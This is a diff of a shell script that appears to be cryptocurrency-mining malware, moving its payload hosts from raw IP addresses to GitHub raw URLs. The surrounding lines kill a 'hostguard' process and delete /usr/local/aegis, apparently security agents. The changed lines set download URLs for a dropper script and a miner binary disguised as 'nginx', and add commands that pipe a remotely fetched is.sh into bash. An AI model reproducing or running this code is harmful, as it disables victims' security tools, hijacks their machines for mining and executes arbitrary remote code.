@@ -95,11 +95,11 @@ ps aux | grep -v grep | grep 'hostguard' | awk '{print $2}' | xargs  -I {}  kill
 
 rm -rf /usr/local/aegis
 
-sh_url="http://103.79.77.16/ep9TS2/nnt.sh"
-miner_url="http://103.79.77.16/ep9TS2/nginx"
+sh_url="https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/nnt.sh"
+miner_url="https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/nginx"
 miner_size="2654112"
-sh_url_backup="http://194.110.247.97/ep9TS2/nnt.sh"
-miner_url_backup="http://194.110.247.97/ep9TS2/nginx"
+sh_url_backup="https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/nnt.sh"
+miner_url_backup="https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/nginx"
 chattr_size="8000"
 
 sleep 1
@@ -616,5 +616,5 @@ fi
 echo "$bbdir"
 echo "$bbdira"
 
-$bbdir -fsSL http://103.79.77.16/ep9TS2/is.sh | bash
-$bbdira -fsSL http://103.79.77.16/ep9TS2/is.sh | bash
+$bbdir -fsSL https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/is.sh | bash
+$bbdira -fsSL https://raw.githubusercontent.com/alfuwyjriiakjdk-lgtm/JSP/refs/heads/main/is.sh | bash
